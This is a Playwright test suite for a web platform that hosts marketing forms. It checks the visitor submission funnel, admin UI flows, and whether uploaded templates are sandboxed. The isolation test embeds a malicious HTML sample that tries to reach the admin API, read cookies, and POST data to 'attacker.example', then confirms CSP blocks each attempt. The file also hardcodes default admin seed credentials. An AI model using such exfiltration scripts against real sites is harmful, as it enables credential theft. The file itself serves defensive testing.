import { test, expect, request as pwRequest } from '@playwright/test';
import fs from 'fs';
import path from 'path';

const WEB = process.env.E2E_WEB_URL ?? 'http://localhost:3000';
const API = process.env.E2E_API_URL ?? 'http://localhost:3001';
const FORMS = process.env.E2E_FORMS_URL ?? 'http://127.0.0.1:3002';
const EMAIL = process.env.SEED_OPERATOR_EMAIL ?? 'admin@glowuprizz.com';
const PASSWORD = process.env.SEED_OPERATOR_PASSWORD ?? 'Password123!';

const SAMPLE = fs.readFileSync(path.resolve(__dirname, '../../../fixtures/sample-form.html'));

// 운영자 로그인 → 템플릿/캠페인/폼/링크 를 API 로 준비하고 공개 URL 반환
async function prepareViaApi(tag: string) {
  const ctx = await pwRequest.newContext({ baseURL: API });
  const login = await ctx.post('/api/auth/login', { data: { email: EMAIL, password: PASSWORD } });
  expect(login.ok()).toBeTruthy();

  const tpl = await (await ctx.post('/api/templates', {
    multipart: { file: { name: 'sample-form.html', mimeType: 'text/html', buffer: SAMPLE }, name: `[테스트] 샘플 폼 · ${tag}` },
  })).json();
  const camp = await (await ctx.post('/api/campaigns', { data: { name: `[테스트] 방문자 퍼널 · ${tag}`, description: 'Playwright 자동 생성 — 배포 링크 방문·제출 흐름 검증' } })).json();
  const form = await (await ctx.post('/api/forms', { data: { campaignId: camp.id, templateId: tpl.id, name: `[테스트] 신청 폼 · ${tag}` } })).json();
  const link = await (await ctx.post('/api/links', { data: { formId: form.id, channel: 'INSTAGRAM' } })).json();
  return { ctx, tpl, camp, form, link };
}

test.describe('브라우저 퍼널', () => {
  test('방문자: 배포 링크 → 폼 작성 → 제출 → 운영자 성과/명단에 반영', async ({ page }) => {
    const tag = Date.now().toString(36);
    const { ctx, camp, form, link } = await prepareViaApi(tag);

    // 방문자가 인스타 링크로 진입
    await page.goto(link.url);
    await expect(page).toHaveTitle('무료 PT 체험 신청');
    // 운영자 HTML 의 JS 가 살아 있다 (전화번호 자동 포맷)
    await page.fill('#name', '김테스트');
    await page.fill('#phone', '01012345678');
    await expect(page.locator('#phone')).toHaveValue('010-1234-5678');
    await page.selectOption('#goal', 'muscle');
    await page.check('#agree');

    const submitReq = page.waitForResponse((r) => r.url().includes('/submissions') && r.request().method() === 'POST');
    await page.click('button[type=submit]');
    const res = await submitReq;
    expect(res.status()).toBe(201);
    await expect(page.locator('[data-gu-success]')).toHaveText(/신청이 완료/);

    // 운영자 API 에 반영
    const stats = await (await ctx.get('/api/stats/campaigns')).json();
    const mine = stats.find((s: { campaignId: string }) => s.campaignId === camp.id);
    expect(mine).toMatchObject({ visits: 1, visitors: 1, submissions: 1, conversionRate: 1 });

    const ch = await (await ctx.get(`/api/stats/channels?campaignId=${camp.id}`)).json();
    expect(ch.find((c: { channel: string }) => c.channel === 'INSTAGRAM')).toMatchObject({ visits: 1, submissions: 1 });

    const subs = await (await ctx.get(`/api/submissions?formId=${form.id}`)).json();
    expect(subs.total).toBe(1);
    expect(subs.items[0].payload).toMatchObject({ name: '김테스트', phone: '010-1234-5678', goal: 'muscle', agree: 'yes' });
    expect(subs.items[0].link.channel).toBe('INSTAGRAM');
  });

  test('운영자: 관리자 화면 로그인 → 대시보드 → 템플릿 업로드 → 캠페인/폼/링크 생성 UI', async ({ page }) => {
    const tag = Date.now().toString(36);
    await page.goto(`${WEB}/login`);
    await page.fill('#email', EMAIL);
    await page.fill('#password', 'wrong-password-1');
    await page.click('button[type=submit]');
    await expect(page.locator('form p[role=alert]')).toContainText('올바르지 않습니다');

    await page.fill('#password', PASSWORD);
    await page.click('button[type=submit]');
    await expect(page).toHaveURL(`${WEB}/`);
    await expect(page.getByRole('heading', { name: '대시보드' })).toBeVisible();

    // 템플릿 업로드
    await page.goto(`${WEB}/templates`);
    await page.setInputFiles('input[type=file]', { name: 'sample-form.html', mimeType: 'text/html', buffer: SAMPLE });
    await page.getByRole('button', { name: /등록/ }).click();
    await expect(page.getByRole('cell', { name: 'sample-form' }).first()).toBeVisible();

    // 캠페인
    await page.goto(`${WEB}/campaigns`);
    await page.getByPlaceholder(/9월 무료 PT/).fill(`[테스트] 관리자 UI 조작 · ${tag}`);
    await page.getByRole('button', { name: '생성' }).click();
    await page.getByRole('link', { name: `[테스트] 관리자 UI 조작 · ${tag}` }).click();

    // 폼
    await page.getByLabel('폼 이름').fill(`[테스트] UI 생성 폼 · ${tag}`);
    await page.getByRole('button', { name: '폼 만들기' }).click();
    await expect(page.getByRole('heading', { name: `[테스트] UI 생성 폼 · ${tag}` })).toBeVisible();

    // 링크
    await page.getByLabel('채널').click();
    await page.getByRole('option', { name: '유튜브' }).click();
    await page.getByRole('button', { name: '링크 생성' }).click();
    await expect(page.locator('table').getByText('유튜브')).toBeVisible();
    await expect(page.locator('code', { hasText: `${FORMS}/l/` })).toBeVisible();
  });

  test('미인증 접근은 로그인으로 리다이렉트', async ({ page }) => {
    await page.goto(`${WEB}/submissions`);
    await expect(page).toHaveURL(/\/login\?next=%2Fsubmissions/);
  });
});

test.describe('격리: 등록 HTML 은 관리자 인증정보/API 에 접근 불가', () => {
  test('악성 HTML 이 관리자 API 호출·쿠키 접근·외부 유출을 시도해도 모두 차단', async ({ browser }) => {
    const tag = Date.now().toString(36);
    const { ctx } = await prepareViaApi(tag);

    // 운영자가 (실수로/악의로) 관리자 API 를 호출하는 스크립트가 든 HTML 을 등록
    const malicious = `<!doctype html><html><body>
<form><input name="x"/><button type="submit">s</button></form>
<script>
  window.__results = {};
  document.cookie = 'probe=1';
  window.__results.cookies = document.cookie;
  fetch('${API}/api/submissions', { credentials: 'include' })
    .then(r => { window.__results.adminApi = 'reached:' + r.status; })
    .catch(e => { window.__results.adminApi = 'blocked'; });
  fetch('${WEB}/api/submissions', { credentials: 'include' })
    .then(r => { window.__results.webProxy = 'reached:' + r.status; })
    .catch(e => { window.__results.webProxy = 'blocked'; });
  fetch('https://attacker.example/steal', { method: 'POST', body: 'x', mode: 'no-cors' })
    .then(r => { window.__results.exfil = 'reached'; })
    .catch(e => { window.__results.exfil = 'blocked'; });
  try { window.__results.parent = window.top === window ? 'top' : 'framed'; } catch (e) { window.__results.parent = 'denied'; }
</script></body></html>`;
    const tpl = await (await ctx.post('/api/templates', {
      multipart: { file: { name: 'evil.html', mimeType: 'text/html', buffer: Buffer.from(malicious) }, name: `[테스트] 악성 HTML · ${tag}` },
    })).json();
    const camp = await (await ctx.post('/api/campaigns', { data: { name: `[테스트] 격리 검증 · ${tag}`, description: 'Playwright 자동 생성 — 악성 HTML이 관리자 API/쿠키에 접근 못 하는지 검증' } })).json();
    const form = await (await ctx.post('/api/forms', { data: { campaignId: camp.id, templateId: tpl.id, name: `[테스트] 악성 폼 · ${tag}` } })).json();
    const link = await (await ctx.post('/api/links', { data: { formId: form.id, channel: 'X' } })).json();

    // 운영자가 관리자에 로그인한 상태의 브라우저 컨텍스트에서 그 폼을 연다 (최악의 시나리오)
    const context = await browser.newContext();
    const page = await context.newPage();
    await page.goto(`${WEB}/login`);
    await page.fill('#email', EMAIL);
    await page.fill('#password', PASSWORD);
    await page.click('button[type=submit]');
    await expect(page).toHaveURL(`${WEB}/`);
    const adminCookies = await context.cookies(WEB);
    expect(adminCookies.some((c) => c.name === 'gu_admin')).toBeTruthy();

    const cspViolations: string[] = [];
    page.on('console', (m) => { if (/Content Security Policy/i.test(m.text())) cspViolations.push(m.text()); });

    await page.goto(link.url);
    await page.waitForFunction(() => {
      const r = (window as unknown as { __results: Record<string, string> }).__results;
      return r && r.adminApi && r.webProxy && r.exfil;
    });
    const results = await page.evaluate(() => (window as unknown as { __results: Record<string, string> }).__results);

    expect(results.adminApi).toBe('blocked');   // connect-src 'self'
    expect(results.webProxy).toBe('blocked');   // connect-src 'self'
    expect(results.exfil).toBe('blocked');      // connect-src 'self'
    expect(results.cookies).not.toContain('gu_admin'); // 다른 origin + httpOnly
    expect(results.parent).toBe('top');
    expect(cspViolations.length).toBeGreaterThanOrEqual(3);

    // forms origin 의 쿠키에는 관리자 토큰이 없다
    const formsCookies = await context.cookies(FORMS);
    expect(formsCookies.map((c) => c.name)).not.toContain('gu_admin');
    expect(formsCookies.map((c) => c.name)).toContain('gu_vid');
    // visitor 쿠키도 httpOnly 라 JS 에서 안 보인다
    expect(results.cookies).not.toContain('gu_vid');

    // 서버 측에도 관리자 라우트가 없다
    const probe = await pwRequest.newContext({ baseURL: FORMS });
    expect((await probe.get('/api/submissions')).status()).toBe(404);
    expect((await probe.get('/api/auth/me')).status()).toBe(404);

    await context.close();
  });
});
